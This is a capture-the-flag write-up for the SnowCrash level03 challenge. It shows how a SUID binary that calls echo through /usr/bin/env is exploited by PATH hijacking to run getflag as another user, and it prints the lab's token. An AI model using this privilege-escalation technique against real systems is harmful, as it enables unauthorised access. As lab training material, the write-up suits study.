# Goal

find the level04 password
we can retrieve it by launching getflag as flag03

# Reconnaissance

```
level03@SnowCrash:~$ pwd
/home/user/level03
level03@SnowCrash:~$ ls -al
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
```

1. We do not have writing rights in our home

- chmod 777 .

Our home contain a executable file named level03 who belongs to the flag03 user. It has the SUID and SGID bits set, meaning that we can execute it with flag03 rights.

## level03 executable

```
level03@SnowCrash:~$ ./level03
Exploit me
```

testing different strings as argument do not change the program behavior.

strings -a level03 | grep echo
/usr/bin/env echo Exploit me

level03@SnowCrash:~$ objdump -s -j .rodata level03

level03: file format elf32-i386

Contents of section .rodata:

80485d8 03000000 01000200 2f757372 2f62696e ......../usr/bin
80485e8 2f656e76 20656368 6f204578 706c6f69 /env echo Exploi
80485f8 74206d65 00 t me.  
level03@SnowCrash:~$

## angr decompiler on dogbolt.org

int main()
{
unsigned int v0; // [bp-0xc]
unsigned int v1; // [bp-0x8]

    v0 = getegid();
    v1 = geteuid();
    setresgid(v0, v0, v0);
    setresuid(v1, v1, v1);
    return system("/usr/bin/env echo Exploit me");

}

/usr/bin/env is an absolut path
echo a relative path

if we change the PATH environment variable, it will affect only the echo program.

# Exploitation

```
level03@SnowCrash:~$ cp /bin/getflag echo
level03@SnowCrash:~$ ls
echo  level03  toto
level03@SnowCrash:~$ PATH=./ level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
level03@SnowCrash:~$
```
